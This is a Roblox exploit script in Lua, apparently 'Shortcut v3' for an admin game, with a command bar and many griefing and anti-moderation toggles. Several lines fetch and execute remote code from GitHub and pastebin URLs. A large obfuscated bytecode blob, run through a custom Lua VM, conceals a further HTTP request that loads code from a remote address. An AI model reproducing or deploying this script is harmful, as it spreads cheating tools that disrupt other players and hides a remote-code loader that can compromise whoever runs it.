--[[

O BTW This is a HEAVILY modified VERSION of the old script XD

It boots no errors :3

^^^ That note is from the two individuals who kinda leaked it?

I gave this out because it's shitty and broken and terribly coded unlike the remake

A lot of things don't work and don't expect them to ever get fixed. Buy the remake at our discord

]]--


if SCV3global == true then return end
pcall(function() 
	getgenv().SCV3global = true 
end)

if IYglobal then
	game.Players.LocalPlayer:kick("Fatal Error \n Contact staff if this error persists ERROR CODE: 100")
	return
end

shared.lll = print -- don't remove this one. Other loadstrings won't load if you do so

game:GetService("Workspace").FallenPartsDestroyHeight = 0/0 -- temp

game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()
repeat
	task.wait()
until game:IsLoaded()

local scriptActive = true

local padAbuse = false
local temploopgrab = false
local perm = true
local rainbowEx = false
local clickExpode = false
local clickPadban = false
local farding = false
local clickAnnoy = false
local antiBlind = false
local antiMsg = false
local antiSpeed = false
local antiSetgrav = false
local antiTeleport = false
local antiFlash = false
local ccolors = false
local tcheck = false
local banning2 = false -- Don't touch
local trippin = false
local antigear = false
local somethingsmart = false -- Kill paint UI basically only I had to rewrite it a shit ton of times
local antiDog = false
local antiFreeze = false
local blockstorage2 = false
local oldperm = false -- Remains unused cus non-premium has this
local antiFun = false
local testgrab = false
local emrgrab = false -- VERY BROKEN
local lplr = game.Players.LocalPlayer
local antiattach = false
local antiParticles = false
local antiRageTable = false
local fpsboost = false
local antiSeizure = false
local antiFlash = false
local antiDisco = false
local antiRageTable = false
local poweronly = false
local unlockprefixes = false
local antipaint = false
local loopstopsounds = false
local v3disconnecting = false
local v3disconnecting2 = true
local gamewidereport = true
local m = game:GetService('Players').LocalPlayer:GetMouse()
local GC = getconnections or get_signal_cons -- For the GUI inputs.
shared.antikick = false
shared.antinoclip = false
shared.laggerdown = false


local notiflib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Tech-187/Temp/main/scv3_notiflib.txt", true))()

function logn(msg)
    pcall(function()
    notiflib:NewNotif(msg, 1)
    end)
end

function longlogn(msg)
    pcall(function()
    notiflib:NewNotif(msg, 6.5)
    end)
end

-- //GUI Retoggles\\--
local reantispeed = false
shared.secondtimecheck = true -- Important for detections and tutorials

local loopnum = "99999999999999999999999999999999"
local antilog = "00000000000000000000000000000000"
--[[
shared.pmlag = "\n\n\n\n\n\n\n\n\n\n\n\n\n\n😊😇😝🤪😜😊😆🙂🤪🤣😜😅\n😀🙂😀😃🤪😜😁😝😆😊😅😀🙃😝😇😇😇🙃😇🙂🤣🤣😆😆😇😃😜😀😝🤪😀😝😄😉😅🤪\n🤪😀😆🤪😆😇😅😉🤣🤪🤣🙂😅😅😁😄😉😀😊🤪😇😄😇😀😝😀😊\n😇😝🤪😜😊😆🙂🤪🤣😜😅😀🙂😀😃🤪😜😁😝😆😊😅😀\n🙃😝😇😇😇🙃😇🙂🤣🤣😆😆😇😃😜😀😝🤪😀\n😝😄😉😅🤪🤪😀😆🤪😆😇😅😉🤣🤪🤣🙂😅😅😁😄😉\n😀😊🤪😇😄😇😀😝😀😊😇😝🤪😜😊😆🙂🤪🤣😜😅😀🙂😀😃🤪😜😁😝😆\n😊😅😀🙃😝😇😇😇🙃😇🙂🤣🤣😆😆😇😃😜😀😝🤪😀😝😄😉😅🤪🤪😀😆🤪😆😇😅😉🤣🤪🤣\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
]] -- Moved to PASS loadstring

local prefix = "//"

-- BasicSetup (ExVariables):

function pass()
	game.Players:Chat("#") -- Don't call me weird for this it's only a test
end
function rejoin()
	game.Players:Chat("//rj")
end

--local req = (syn and syn.request) or request or (http and http.request) or http_request
local xsize = 1525
local ysize = 60
local textcolor = Color3.fromRGB(150, 150, 150)
local color1 = Color3.fromRGB(89, 89, 89)
local color2 = Color3.fromRGB(0, 0, 0)

local gameFlr = workspace.Terrain._Game
local adminFlr = gameFlr.Admin
local plyrs = game:GetService("Players")
local rns = game:GetService("RunService")
local tps = game:GetService("TeleportService")
local http = game:GetService("HttpService")
local ws = game:GetService("Workspace")
local plyrs = game:GetService("Players")
local sg = game:GetService("StarterGui")
local uis = game:GetService("UserInputService")
local Cmdscreen = Instance.new("ScreenGui")
local CmdBarBackground = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Main = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local TextBox = Instance.new("TextBox")
pcall(function()

	Cmdscreen.Name = "Cmdscreen"
	Cmdscreen.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	Cmdscreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	CmdBarBackground.Name = "CmdBarBackground"
	CmdBarBackground.Parent = Cmdscreen
	CmdBarBackground.BackgroundColor3 = color1
	CmdBarBackground.Position = UDim2.new(0.5, -xsize/2, 1, 0)
	CmdBarBackground.Size = UDim2.new(0, xsize, 0, ysize)

	UICorner.CornerRadius = UDim.new(0, 5)
	UICorner.Parent = CmdBarBackground

	Main.Name = "Main"
	Main.Parent = CmdBarBackground
	Main.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
	Main.Position = UDim2.new(0, 2, 0, 2)
	Main.Size = UDim2.new(1, -4, 1, -4)

	UICorner_2.CornerRadius = UDim.new(0, 5)
	UICorner_2.Parent = Main

	UIGradient.Color = ColorSequence.new{
		ColorSequenceKeypoint.new(0.00, color1),
		ColorSequenceKeypoint.new(1.00, color2)
	}
	UIGradient.Rotation = 90
	UIGradient.Parent = Main

	TextBox.Parent = Main
	TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextBox.BackgroundTransparency = 1.000
	TextBox.Size = UDim2.new(1, 0, 1, 0)
	TextBox.Font = Enum.Font.Ubuntu
	TextBox.Text = ""
	TextBox.TextColor3 = textcolor
	TextBox.TextScaled = true
	TextBox.TextSize = 14.000
	TextBox.TextWrapped = true


	local colors = {
		color1,
		color2
	}

	local border = CmdBarBackground
	local main = border.Main
	local text = main.TextBox
	local plrs = game:GetService('Players')
	local tween = game:GetService('TweenService')
	local uis = game:GetService('UserInputService')
	local info = TweenInfo.new(.3, Enum.EasingStyle.Quint) --(SPEED, STYLE)
	local show = tween:Create(border, info, {Position = UDim2.new(.5, -border.AbsoluteSize.X/2, 0.05, -60)})
	local hide = tween:Create(border, info, {Position = UDim2.new(.5, -border.AbsoluteSize.X/2, 1, 0)})
	local tweening = false
	coroutine.wrap(function()
		while true do
			for i,v in pairs(colors) do
				local butt = tween:Create(border, TweenInfo.new(.8, Enum.EasingStyle.Linear), {BackgroundColor3 = v})
				butt:Play()
				butt.Completed:Wait()
			end
		end
	end)()

	function toggle()
		if not tweening then
			tweening = true
			if border.Position.X.Offset == 0 then
				hide:Play()
				text:ReleaseFocus()
				text.Text = ''
				hide.Completed:Wait()
			else
				show:Play()
				text:CaptureFocus()
				show.Completed:Wait()
			end
			tweening = false
		end
	end

	text.FocusLost:Connect(function(enterPressed)
		tweening = true
		if enterPressed then
			plrs:Chat(text.Text)
		end
		hide:Play()
		text:ReleaseFocus()
		text.Text = ''
		hide.Completed:Wait()
		tweening = false
	end)
	uis.InputBegan:Connect(function(input, gp)
		if not gp then
			if input.UserInputType == Enum.UserInputType.Keyboard then
				local key = input.KeyCode
				if key == Enum.KeyCode.Quote then
					game:GetService'RunService'.Heartbeat:Wait()
					toggle()
				end
			end
		end
	end)
	game:GetService("Players").LocalPlayer.PlayerGui.Cmdscreen.ResetOnSpawn = false
end)

function __raw__chatt(i) plyrs:Chat(i) end

local connections = {}

local Utils = {
	Task = {}
}

function Utils.Task:wait(a1)
	if a1 == nil or a1 <= 0 then
		a1 = 1
	end
	local __o__w = os.clock()
	a1 = a1 * 0.001

	local delta = 0
	repeat
		delta = task.wait()
	until os.clock() + delta >= __o__w + a1
	repeat
		if true then
		end
	until __o__w + a1 <= os.clock()
end

function Utils:__wait()
	rns.Heartbeat:Wait()
end
function Utils.getPlr(str)
	local myInput = string.lower(str)
	for i, v in ipairs(plyrs:GetPlayers()) do
		if string.sub(string.lower(v.Character.Name), 1, #myInput) == myInput then
			return v.Character.Name
		end
	end
end
function Utils.ejectScript()
	scriptActive = false -- stop all loops and stuff
	sg:SetCoreGuiEnabled("PlayerList", true)
	PlayerList:Destroy()
	for i, v in ipairs(connections) do
		if v then
			v:Disconnect()
		end
	end
end

function Utils.ejectGUI()
	sg:SetCoreGuiEnabled("PlayerList", true)
	PlayerList:Destroy()
end

local invisiblebox = Instance.new("TextBox", workspace)

--// Chatbypass --\\
-- 1
local function chatt(massage)
	invisiblebox:SetTextFromInput(massage)
	game.Players:Chat(massage)
end

local function mslash()
	chatt("m/ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Hello Shortcut v3 user. \n Since you're using this script on an account with this \n gamepass, you'll be having priorities. \n Check Shortcut's commands list and you'll see why :) \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
end

function createKohlsUi(textTable)
	local kohlsUI = Instance.new("ScreenGui")
	local TextButton = Instance.new("TextButton")
	local Frame = Instance.new("Frame")
	local closeUi = Instance.new("TextButton")
	local Frame_2 = Instance.new("Frame")
	local a = Instance.new("TextLabel")
	local UIGridLayout = Instance.new("UIGridLayout")
	local clearUi = Instance.new("TextButton")

	--Properties:

	kohlsUI.Name = "kohlsUI"
	kohlsUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	kohlsUI.ResetOnSpawn = false

	TextButton.Parent = kohlsUI
	TextButton.BackgroundTransparency = 1.000
	TextButton.Draggable = true
	TextButton.Position = UDim2.new(0.5, -548, 0.5, -94)
	TextButton.Size = UDim2.new(0, 385, 0, 20)
	TextButton.AutoButtonColor = false
	TextButton.Text = ""

	Frame.Parent = TextButton
	Frame.ClipsDescendants = true
	Frame.Size = UDim2.new(0, 400, 0, 400)
	Frame.ZIndex = 7
	Frame.Style = Enum.FrameStyle.RobloxRound

	closeUi.Name = "closeUi"
	closeUi.Parent = Frame
	closeUi.Position = UDim2.new(1, -15, 0, -5)
	closeUi.Size = UDim2.new(0, 20, 0, 20)
	closeUi.ZIndex = 10
	closeUi.Style = Enum.ButtonStyle.RobloxButtonDefault
	closeUi.Font = Enum.Font.ArialBold
	closeUi.Text = "v3"
	closeUi.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeUi.TextSize = 18.000

	Frame_2.Parent = Frame
	Frame_2.Position = UDim2.new(0, 0, 0, -9)
	Frame_2.ZIndex = 8

	a.Name = "a"
	a.Parent = Frame_2
	a.BackgroundTransparency = 1.000
	a.Position = UDim2.new(NAN, 0, NAN, 0)
	a.Size = UDim2.new(200, 18, 200, 18)
	a.ZIndex = 8
	a.Font = Enum.Font.Arial
	a.Text = ""
	a.TextColor3 = Color3.fromRGB(255, 255, 255)
	a.TextSize = 18.000
	a.TextStrokeTransparency = 0.800
	a.TextXAlignment = Enum.TextXAlignment.Left
	a.TextYAlignment = Enum.TextYAlignment.Top

	UIGridLayout.Parent = Frame_2
	UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIGridLayout.CellSize = UDim2.new(0, 100, 0, 18)

	clearUi.Name = "clearUi"
	clearUi.Parent = Frame
	clearUi.Position = UDim2.new(0.944999993, -15, 0, -5)
	clearUi.Size = UDim2.new(0, 20, 0, 20)
	clearUi.ZIndex = 10
	clearUi.Style = Enum.ButtonStyle.RobloxButtonDefault
	clearUi.Font = Enum.Font.ArialBold
	clearUi.Text = "SC"
	clearUi.TextColor3 = Color3.fromRGB(255, 255, 255)
	clearUi.TextSize = 18.000

	-- Scripts:

	local function NNQOKB_fake_script() -- Frame_2.LocalScript 
		local script = Instance.new('LocalScript', Frame_2)

		function addLabel(txt)
			local newLb = script.Parent.a:Clone()
			newLb.Name = "TextLabel"
			newLb.Text = txt
			newLb.Parent = script.Parent
		end

		function addLabelWCheck(txt)
			local cnt = 0
			for i,v in pairs(script.Parent:GetChildren()) do
				if v.Name == "TextLabel" then
					cnt = cnt + 1
				end
			end
			if cnt >= 16 then
				clearLabels()
			end
			addLabel(txt)
		end

		function clearLabels()
			for i,v in pairs(script.Parent:GetChildren()) do
				if v.Name == "TextLabel" then
					v:Destroy()
				end
			end
		end

		script.Parent.Parent.closeUi.MouseButton1Click:Connect(function()
			script.Parent.Parent.Parent.Parent:Destroy()
		end)

		script.Parent.Parent.clearUi.MouseButton1Click:Connect(clearLabels)

		for _, text in ipairs(textTable) do
			addLabelWCheck(text)
		end
	end
	coroutine.wrap(NNQOKB_fake_script)()
end

loadstring(game:HttpGet(('https://pastebin.com/raw/7LJZvW5t'),true))() -- Temp bin pretty much

local a={'\27','\76','\117','\97','\81','\0','\1','\4','\8','\4','\8','\0','\10','\0','\0','\0','\0','\0','\0','\0','\64','\109','\97','\105','\110','\46','\108','\117','\97','\0','\5','\0','\0','\0','\14','\0','\0','\0','\0','\0','\0','\4','\25','\0','\0','\0','\5','\0','\0','\0','\69','\128','\0','\0','\9','\64','\128','\128','\5','\192','\0','\0','\28','\64','\128','\0','\5','\0','\1','\0','\26','\64','\0','\0','\22','\192','\1','\128','\5','\64','\1','\0','\26','\64','\0','\0','\22','\0','\1','\128','\5','\128','\1','\0','\26','\64','\0','\0','\22','\64','\0','\128','\5','\192','\1','\0','\6','\64','\65','\0','\64','\0','\0','\0','\138','\64','\0','\0','\137','\64','\66','\132','\92','\128','\0','\1','\133','\128','\2','\0','\198','\192','\194','\0','\156','\128','\0','\1','\156','\64','\128','\0','\30','\0','\128','\0','\12','\0','\0','\0','\4','\7','\0','\0','\0','\0','\0','\0','\0','\115','\104','\97','\114','\101','\100','\0','\4','\4','\0','\0','\0','\0','\0','\0','\0','\108','\108','\108','\0','\4','\6','\0','\0','\0','\0','\0','\0','\0','\112','\114','\105','\110','\116','\0','\4','\5','\0','\0','\0','\0','\0','\0','\0','\119','\97','\105','\116','\0','\4','\13','\0','\0','\0','\0','\0','\0','\0','\104','\116','\116','\112','\95','\114','\101','\113','\117','\101','\115','\116','\0','\4','\8','\0','\0','\0','\0','\0','\0','\0','\114','\101','\113','\117','\101','\115','\116','\0','\4','\9','\0','\0','\0','\0','\0','\0','\0','\72','\116','\116','\112','\80','\111','\115','\116','\0','\4','\4','\0','\0','\0','\0','\0','\0','\0','\115','\121','\110','\0','\4','\4','\0','\0','\0','\0','\0','\0','\0','\85','\114','\108','\0','\4','\71','\0','\0','\0','\0','\0','\0','\0','\104','\116','\116','\112','\115','\58','\47','\47','\114','\97','\119','\46','\103','\105','\116','\104','\117','\98','\117','\115','\101','\114','\99','\111','\110','\116','\101','\110','\116','\46','\99','\111','\109','\47','\84','\101','\99','\104','\45','\49','\56','\55','\47','\84','\101','\109','\112','\47','\109','\97','\105','\110','\47','\99','\111','\104','\116','\37','\50','\48','\108','\111','\97','\100','\115','\116','\114','\105','\110','\103','\0','\4','\11','\0','\0','\0','\0','\0','\0','\0','\108','\111','\97','\100','\115','\116','\114','\105','\110','\103','\0','\4','\5','\0','\0','\0','\0','\0','\0','\0','\66','\111','\100','\121','\0','\0','\0','\0','\0','\25','\0','\0','\0','\7','\0','\0','\0','\7','\0','\0','\0','\7','\0','\0','\0','\8','\0','\0','\0','\8','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\9','\0','\0','\0','\10','\0','\0','\0','\10','\0','\0','\0','\10','\0','\0','\0','\10','\0','\0','\0','\12','\0','\0','\0','\12','\0','\0','\0','\12','\0','\0','\0','\12','\0','\0','\0','\14','\0','\0','\0','\2','\0','\0','\0','\9','\0','\0','\0','\0','\0','\0','\0','\114','\101','\113','\117','\101','\115','\116','\115','\0','\16','\0','\0','\0','\24','\0','\0','\0','\7','\0','\0','\0','\0','\0','\0','\0','\115','\99','\114','\105','\112','\116','\0','\20','\0','\0','\0','\24','\0','\0','\0','\0','\0','\0','\0'}local b={"ABC","ABx","ABC","ABC","ABC","ABx","ABC","ABx","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","AsBx","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","AsBx","AsBx","ABC","ABC","ABC","ABx","ABC"}local c={"MOVE","LOADK","LOADBOOL","LOADNIL","GETUPVAL","GETGLOBAL","GETTABLE","SETGLOBAL","SETUPVAL","SETTABLE","NEWTABLE","SELF","ADD","SUB","MUL","DIV","MOD","POW","UNM","NOT","LEN","CONCAT","JMP","EQ","LT","LE","TEST","TESTSET","CALL","TAILCALL","RETURN","FORLOOP","FORPREP","TFORLOOP","SETLIST","CLOSE","CLOSURE","VARARG"}local function d(e,f,g)if g then local h=0;local i=0;for j=f,g do h=h+2^i*d(e,j)i=i+1 end;return h else local k=2^(f-1)return e%(k+k)>=k and 1 or 0 end end;local function l(m)local n=1;local o=false;local p;local q;local r,s;local t,u,v,w,x;do function t()local y=m:byte(n,n)n=n+1;return y end;function u()local y,z,A,B=m:byte(n,n+3)n=n+4;return B*16777216+A*65536+z*256+y end;function v()local y=u()local z=u()return z*4294967296+y end;function w()local y=u()local z=u()return(-2*d(z,32)+1)*2^(d(z,21,31)-1023)*((d(z,1,20)*2^32+y)/2^52+1)end;function x(C)local D;if C then D=m:sub(n,n+C-1)n=n+C else C=s()if C==0 then return end;D=m:sub(n,n+C-1)n=n+C end;return D end end;local function E()local F;local G={}local H={}local I={}local J={lines={}}F={instructions=G,constants=H,prototypes=I,debug=J}local K;F.name=x()F.first_line=r()F.last_line=r()if F.name then F.name=F.name:sub(1,-2)end;F.upvalues=t()F.arguments=t()F.varg=t()F.stack=t()do K=r()for j=1,K do local L={}local a=u()local M=d(a,1,6)local N=b[M+1]L.opcode=M;L.type=N;L.A=d(a,7,14)if N=="ABC"then L.B=d(a,24,32)L.C=d(a,15,23)elseif N=="ABx"then L.Bx=d(a,15,32)elseif N=="AsBx"then L.sBx=d(a,15,32)-131071 end;G[j]=L end end;do K=r()for j=1,K do local O={}local N=t()O.type=N;if N==1 then O.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=t()~=0 elseif N==3 then O.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=w()elseif N==4 then O.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=x():sub(1,-2)end;H[j-1]=O end end;do K=r()for j=1,K do I[j-1]=E()end end;do local a=J.lines;K=r()for j=1,K do a[j]=u()end;K=r()for j=1,K do x():sub(1,-2)u()u()end;K=r()for j=1,K do x()end end;return F end;do assert(x(4)=="\27Lua","S1MPLYS3C7RED: Bytecode expected")assert(t()==0x51,"S1MPLYS3C7RED: Only lua5.1 is supported")t()o=t()==0;p=t()q=t()if p==4 then r=u elseif p==8 then r=v else error("")end;if q==4 then s=u elseif q==8 then s=v else error("")end;assert(x(3)=="\4\8\0","S1MPLYS3C7RED: Unsupported platform")end;return E()end;local function P(...)local A=select("#",...)local Q={...}return A,Q end;local function R(S,T)local G=S.instructions;local H=S.constants;local I=S.prototypes;local U,V;local W;local X=1;local Y,Z;local _={[0]=function(L)U[L.A]=U[L.B]end,[1]=function(L)U[L.A]=H[L.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI end,[2]=function(L)U[L.A]=L.B~=0;if L.C~=0 then X=X+1 end end,[3]=function(L)local U=U;for j=L.A,L.B do U[j]=nil end end,[4]=function(L)U[L.A]=T[L.B]end,[5]=function(L)local a0=H[L.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;U[L.A]=W[a0]end,[6]=function(L)local a1=L.C;local U=U;a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=U[L.B][a1]end,[7]=function(L)local a0=H[L.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;W[a0]=U[L.A]end,[8]=function(L)T[L.B]=U[L.A]end,[9]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A][a2]=a1 end,[10]=function(L)U[L.A]={}end,[11]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;a2=U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[a3+1]=a2;U[a3]=a2[a1]end,[12]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2+a1 end,[13]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2-a1 end,[14]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2*a1 end,[15]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2/a1 end,[16]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2%a1 end,[17]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2^a1 end,[18]=function(L)U[L.A]=-U[L.B]end,[19]=function(L)U[L.A]=not U[L.B]end,[20]=function(L)U[L.A]=#U[L.B]end,[21]=function(L)local a2=L.B;local a4=U[a2]for j=a2+1,L.C do a4=a4 ..U[j]end;U[L.A]=a4 end,[22]=function(L)X=X+L.sBx end,[23]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U,H=U,H;a3=a3~=0;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]if a2==a1~=a3 then X=X+1 end end,[24]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U,H=U,H;a3=a3~=0;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]if a2<a1~=a3 then X=X+1 end end,[25]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U,H=U,H;a3=a3~=0;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]if a2<=a1~=a3 then X=X+1 end end,[26]=function(L)if U[L.A]==(L.C~=0)then X=X+1 end end,[27]=function(L)local U=U;local a2=U[L.B]if a2==(L.C~=0)then X=X+1 else U[L.A]=a2 end end,[28]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;local a5,a6;local a7,a8;a5={}if a2~=1 then if a2~=0 then a7=a3+a2-1 else a7=V end;a8=0;for j=a3+1,a7 do a8=a8+1;a5[a8]=U[j]end;a7,a6=P(U[a3](unpack(a5,1,a7-a3)))else a7,a6=P(U[a3]())end;V=a3-1;if a1~=1 then if a1~=0 then a7=a3+a1-2 else a7=a7+a3 end;a8=0;for j=a3,a7 do a8=a8+1;U[j]=a6[a8]end end end,[29]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;local a5,a6;local V,a7,a8=V;a5={}if a2~=1 then if a2~=0 then a7=a3+a2-1 else a7=V end;a8=0;for j=a3+1,a7 do a8=a8+1;a5[#a5+1]=U[j]end;a6={U[a3](unpack(a5,1,a7-a3))}else a6={U[a3]()}end;return true,a6 end,[30]=function(L)local a3=L.A;local a2=L.B;local U=U;local a7;local a8,a9;if a2==1 then return true end;if a2==0 then a7=V else a7=a3+a2-2 end;a9={}local a8=0;for j=a3,a7 do a8=a8+1;a9[a8]=U[j]end;return true,a9 end,[31]=function(L)local a3=L.A;local U=U;local aa=U[a3+2]local n=U[a3]+aa;U[a3]=n;if aa>0 then if n<=U[a3+1]then X=X+L.sBx;U[a3+3]=n end else if n>=U[a3+1]then X=X+L.sBx;U[a3+3]=n end end end,[32]=function(L)local a3=L.A;local U=U;U[a3]=U[a3]-U[a3+2]X=X+L.sBx end,[33]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;local ab=a3+2;local a4={U[a3](U[a3+1],U[a3+2])}for j=1,a1 do U[ab+j]=a4[j]end;if U[a3+3]~=nil then U[a3+2]=U[a3+3]else X=X+1 end end,[34]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;if a1==0 then error("NYI: extended SETLIST")else local ab=(a1-1)*50;local Q=U[a3]if a2==0 then a2=V end;for j=1,a2 do Q[ab+j]=U[a3+j]end end end,[35]=function(L)io.stderr:write("NYI: CLOSE")io.stderr:flush()end,[36]=function(L)local ac=I[L.Bx]local G=G;local U=U;local ad={}local ae=setmetatable({},{__index=function(Q,af)local ag=ad[af]return ag.segment[ag.offset]end,__newindex=function(Q,af,ah)local ag=ad[af]ag.segment[ag.offset]=ah end})for j=1,ac.upvalues do local ai=G[X]if ai.opcode==0 then ad[j-1]={segment=U,offset=ai.B}elseif G[X].opcode==4 then ad[j-1]={segment=T,offset=ai.B}end;X=X+1 end;local aj,ak=R(ac,ae)U[L.A]=ak end,[37]=function(L)local a3=L.A;local a2=L.B;local U,Y=U,Y;for j=a3,a3+(a2>0 and a2-1 or Z)do U[j]=Y[j-a3]end end}local function a8()local G=G;local L,y,z;while true do L=G[X]X=X+1;y,z=_[L.opcode](L)if y then return z end end end;local al={get_stack=function()return U end,get_IP=function()return X end}local function ak(...)local am={}local an={}V=-1;U=setmetatable(am,{__index=an,__newindex=function(Q,af,ah)if af>V and ah then V=af end;an[af]=ah end})local a5={...}Y={}Z=select("#",...)-1;for j=0,Z do am[j]=a5[j+1]Y[j]=a5[j+1]end;W=getfenv()X=1;local ao=coroutine.create(a8)local y,z=coroutine.resume(ao)if y then if z then return unpack(z)end;return else local ap=S.name;local aq=S.debug.lines[X]local ar=z:gsub("(.-:)","")local a9=""a9=a9 ..(ap and ap..":"or"")a9=a9 ..(aq and aq..":"or"")a9=a9 ..z;error(a9,0)end end;return al,ak end;local as={IlIIIIIIlIllIIlIlIIIllIllIIlllIllll=function(m)local S=l(m)local aj,ak=R(S)return ak end,utils={lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll=l,IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl=R,IlllIIIllIlllIlIIIllllIIllllIIllllI=function(m)local S=l(m)return R(S)end}}as.IlIIIIIIlIllIIlIlIIIllIllIIlllIllll(table.concat(a,[[]]))()

--loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/IIlIllIlllllIllIChecker'),true))()

----------Other stuff

--loadstring(game:HttpGet(('https://raw.githubusercontent.com/Tech-187/Temp/main/fiber'),true))() SLOCK REMOVED FOR NOW

coroutine.wrap(function()
	game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()

	local loaded = false

	coroutine.wrap(function()
		task.wait(8)
		if not loaded then
			print("Crashed")
			local http = game:GetService("HttpService")
			local tpSrv = game:GetService("TeleportService")

			local gmId = game.PlaceId -- game.PlaceId

			local wb = "https://games.roblox.com/v1/games/" .. gmId .. "/servers/Public?sortOrder=Asc&limit=100"

			while true do
				wait(2.5)
				local srvDt = http:JSONDecode(game:HttpGetAsync(wb)).data

				local svrList = {}
				for _, v in ipairs(srvDt) do
					pcall(
						function()
							if type(v) == "table" and v.Id ~= game.JobId and 6 > v.playing then
								local validSrv = true
								for n, m in pairs(v.playerTokens) do
									if m == "4EE36373CEF89093957ADC11189D5B4A" then
										validSrv = false
									end
								end
								if validSrv then
									pcall(function()
										if v.ping ~= 0 then
											svrList[#svrList + 1] = v.id
										end
									end)
								end
							end
						end)
				end
				local b, n =
					pcall(
						function()
							tpSrv:TeleportToPlaceInstance(gmId, svrList[math.random(1, #svrList)])
						end)
				if b then
					print("New server found!")
				else
					print("No new servers found")
				end
			end
		end
	end)()

	repeat
		task.wait()
	until game:IsLoaded()

	loaded = true
end)()

game.StarterGui.ResetPlayerGuiOnSpawn = false

function say(msg)
	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

function hasGamepass(plrId, id)
	local plrData = game:HttpGet("https://inventory.roblox.com/v1/users/" .. plrId .. "/items/GamePass/" .. id)
	local hasPerm = false
	if string.match(plrData, tostring(id)) then
		hasPerm = true
	end
	return hasPerm
end

-- BasicSetup (Exc-;):

--//   Perm, Loopgrab and Utils etc   //--

